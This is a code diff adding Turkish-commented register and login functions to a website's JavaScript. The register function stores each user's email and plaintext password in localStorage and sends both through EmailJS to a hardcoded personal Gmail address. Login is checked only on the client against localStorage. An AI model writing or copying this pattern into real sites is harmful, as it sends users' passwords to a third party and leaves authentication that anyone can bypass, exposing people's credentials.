@@ -21,3 +21,44 @@ serviceQuestions.forEach(question => {
         serviceItem.classList.toggle('active');
     });
 });
+// Kayıt olma işlemi
+function register() {
+    const email = document.getElementById('registerEmail').value;
+    const password = document.getElementById('registerPassword').value;
+
+    if (email && password) {
+        // Bilgileri localStorage'a kaydet
+        localStorage.setItem('userEmail', email);
+        localStorage.setItem('userPassword', password);
+
+        // EmailJS ile e-posta gönder
+        emailjs.send("service_mqj01mn", "template_46zfypd", {
+            to_email: "enestunoglu95@gmail.com", // Bilgilerin gönderileceği e-posta
+            user_email: email,
+            user_password: password
+        }).then(function(response) {
+            alert('Kayıt başarılı! Bilgileriniz e-posta ile gönderildi.');
+            window.location.href = "giris.html"; // Giriş sayfasına yönlendir
+        }, function(error) {
+            alert('E-posta gönderilirken bir hata oluştu.');
+        });
+    } else {
+        alert('Lütfen tüm alanları doldurun.');
+    }
+}
+
+// Giriş yapma işlemi
+function login() {
+    const email = document.getElementById('loginEmail').value;
+    const password = document.getElementById('loginPassword').value;
+
+    const storedEmail = localStorage.getItem('userEmail');
+    const storedPassword = localStorage.getItem('userPassword');
+
+    if (email === storedEmail && password === storedPassword) {
+        alert('Giriş başarılı!');
+        window.location.href = "index.html"; // Ana sayfaya yönlendir
+    } else {
+        alert('Giriş başarısız. Lütfen bilgilerinizi kontrol edin.');
+    }
+}
